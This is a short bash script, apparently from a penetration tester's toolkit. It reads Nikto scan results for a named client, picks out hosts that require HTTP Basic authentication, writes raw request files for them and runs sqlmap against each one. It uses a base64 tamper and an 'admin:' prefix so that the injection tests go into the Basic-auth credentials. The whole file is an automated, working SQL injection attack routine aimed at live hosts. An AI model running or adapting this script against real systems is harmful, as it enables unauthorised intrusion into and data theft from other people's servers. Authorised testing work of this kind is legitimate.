#!/bin/bash
# git clone https://github.com/andresriancho/w3af.git
if [ -z $1 ]; then printf "\nSytnax: $0 <client>\n\n"
	else
CLIENT=$1; cd ~/sqlmap; for TARGET in $(grep -l 'Requires Authentication for realm' ~/$CLIENT/nikto-output-*.txt|sort -u|awk -F- '{print $3":"$4":"$5}'); do
   HOST=$(echo $TARGET|cut -d':' -f1); PORT=$(echo $TARGET|cut -d':' -f2); PROTO=$(echo $TARGET|cut -d':' -f3);
   if [ "$PROTO" == "ssl.txt" ];then
      echo "GET / HTTP/1.1#Host: $HOST:$PORT#User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.7.0#Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8#Accept-Language: en-US,en;q=0.5#Accept-Encoding: gzip, deflate#Connection: keep-alive#Authorization: Basic *#" | tr '#' '\n' > ~/$CLIENT/sqlmap-input-$HOST-$PORT-https-basic.req
      python sqlmap.py --force-ssl --ignore-401 --batch --level=3 --risk=1 --tamper=tamper/base64encode.py -r ~/$CLIENT/sqlmap-input-$HOST-$PORT-https-basic.req | tee ~/$CLIENT/sqlmap-output-$HOST-$PORT-https-basic.txt
      python sqlmap.py --force-ssl --ignore-401 --batch --level=3 --risk=1 --tamper=tamper/base64encode.py -r ~/$CLIENT/sqlmap-input-$HOST-$PORT-https-basic.req --prefix "admin:" | tee ~/$CLIENT/sqlmap-output-$HOST-$PORT-https-basic-prefix.txt
   elif [ "$PROTO" == "nossl.txt" ];then
      echo "GET / HTTP/1.1#Host: $HOST:$PORT#User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.7.0#Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8#Accept-Language: en-US,en;q=0.5#Accept-Encoding: gzip, deflate#Connection: keep-alive#Authorization: Basic *#" | tr '#' '\n' > ~/$CLIENT/sqlmap-input-$HOST-$PORT-http-basic.req
      python sqlmap.py --ignore-401 --batch --level=3 --risk=1 --tamper=tamper/base64encode.py -r ~/$CLIENT/sqlmap-input-$HOST-$PORT-http-basic.req | tee ~/$CLIENT/sqlmap-output-$HOST-$PORT-http-basic.txt
      python sqlmap.py --ignore-401 --batch --level=3 --risk=1 --tamper=tamper/base64encode.py -r ~/$CLIENT/sqlmap-input-$HOST-$PORT-http-basic.req --prefix "admin:" | tee ~/$CLIENT/sqlmap-output-$HOST-$PORT-http-basic-prefix.txt
   else
	echo "Dammit Bobby. $TARGET is a failure."
   fi
   done
fi
